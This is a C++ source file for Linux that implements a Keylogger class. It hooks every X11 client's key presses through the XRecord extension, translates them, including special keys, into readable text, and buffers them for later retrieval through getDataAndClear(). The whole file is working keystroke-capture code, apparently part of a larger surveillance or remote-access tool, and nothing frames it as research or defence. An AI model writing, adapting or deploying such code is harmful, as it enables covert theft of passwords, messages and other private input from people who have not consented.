#include "KeyboardController.h"
#ifdef __linux__

std::vector<string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false), x11Display(0) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer.push_back(str);
}

static Keylogger* g_keylogger = nullptr;

void Keylogger::LinuxLoop() {
    Display* ctrlDisplay = XOpenDisplay(NULL);
    Display* dataDisplay = XOpenDisplay(NULL);
    if (!ctrlDisplay || !dataDisplay) return;

    g_keylogger = this;
    XRecordRange* range = XRecordAllocRange();
    range->device_events.first = KeyPress;
    range->device_events.last = KeyPress;
    XRecordClientSpec spec = XRecordAllClients;
    XRecordContext ctx = XRecordCreateContext(ctrlDisplay, 0, &spec, 1, &range, 1);
    XFree(range);

    if (!ctx) {
        XCloseDisplay(ctrlDisplay);
        XCloseDisplay(dataDisplay);
        return;
    }

    XRecordEnableContext(dataDisplay, ctx, 
        [](XPointer priv, XRecordInterceptData* data) {
            if (data->category == XRecordFromServer) {
                xEvent* event = (xEvent*)data->data;
                if (event->u.u.type == KeyPress) {
                    XKeyEvent xke;
                    memset(&xke, 0, sizeof(xke));
                    xke.display = (Display*)priv;
                    xke.keycode = event->u.u.detail;
                    xke.state = 0;

                    KeySym keysym = XLookupKeysym(&xke, 0);
                    
                    if (keysym == XK_Return) g_keylogger->append("[RETURN]");
                    else if (keysym == XK_Tab) g_keylogger->append("[TAB]");
                    else if (keysym == XK_space) g_keylogger->append(" ");
                    else if (keysym == XK_BackSpace) g_keylogger->append("[DELETE]");
                    else if (keysym == XK_Delete) g_keylogger->append("[DEL]");
                    else if (keysym == XK_Escape) g_keylogger->append("[ESC]");
                    else if (keysym == XK_Super_L || keysym == XK_Super_R) g_keylogger->append("[CMD]");
                    else if (keysym == XK_Shift_L || keysym == XK_Shift_R) g_keylogger->append("[SHIFT]");
                    else if (keysym == XK_Caps_Lock) g_keylogger->append("[CAPS]");
                    else if (keysym == XK_Alt_L || keysym == XK_Alt_R || keysym == XK_Meta_L || keysym == XK_Meta_R) g_keylogger->append("[OPT]");
                    else if (keysym == XK_Control_L || keysym == XK_Control_R) g_keylogger->append("[CTRL]");
                    else if (keysym == XK_Left) g_keylogger->append("[LEFT]");
                    else if (keysym == XK_Right) g_keylogger->append("[RIGHT]");
                    else if (keysym == XK_Up) g_keylogger->append("[UP]");
                    else if (keysym == XK_Down) g_keylogger->append("[DOWN]");
                    else if (keysym == XK_Home) g_keylogger->append("[HOME]");
                    else if (keysym == XK_End) g_keylogger->append("[END]");
                    else if (keysym == XK_Page_Up) g_keylogger->append("[PGUP]");
                    else if (keysym == XK_Page_Down) g_keylogger->append("[PGDN]");
                    else if (keysym == XK_Insert) g_keylogger->append("[INS]");
                    else if (keysym == XK_F1) g_keylogger->append("[F1]");
                    else if (keysym == XK_F2) g_keylogger->append("[F2]");
                    else if (keysym == XK_F3) g_keylogger->append("[F3]");
                    else if (keysym == XK_F4) g_keylogger->append("[F4]");
                    else if (keysym == XK_F5) g_keylogger->append("[F5]");
                    else if (keysym == XK_F6) g_keylogger->append("[F6]");
                    else if (keysym == XK_F7) g_keylogger->append("[F7]");
                    else if (keysym == XK_F8) g_keylogger->append("[F8]");
                    else if (keysym == XK_F9) g_keylogger->append("[F9]");
                    else if (keysym == XK_F10) g_keylogger->append("[F10]");
                    else if (keysym == XK_F11) g_keylogger->append("[F11]");
                    else if (keysym == XK_F12) g_keylogger->append("[F12]");
                    else if (keysym == XK_F13) g_keylogger->append("[F13]");
                    else if (keysym == XK_F14) g_keylogger->append("[F14]");
                    else if (keysym == XK_F15) g_keylogger->append("[F15]");
                    else if (keysym == XK_Num_Lock) g_keylogger->append("[NUMLOCK]");
                    else {
                        char buffer[32] = {0};
                        int length = XLookupString(&xke, buffer, sizeof(buffer) - 1, NULL, NULL);
                        if (length > 0) {
                            g_keylogger->append(std::string(buffer, length));
                        }
                    }
                    //XCloseDisplay(xke.display);
                }
            }
            XRecordFreeData(data);
        }, (XPointer)ctrlDisplay); 
        
    XRecordFreeContext(ctrlDisplay, ctx);
    XCloseDisplay(dataDisplay);
    XCloseDisplay(ctrlDisplay);
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->LinuxLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (_workerThread.joinable()) {
        _workerThread.detach();
    }
}

std::vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    std::vector<std::string> dataCopy = _buffer;
    _buffer.clear();
    return dataCopy;
}

#endif
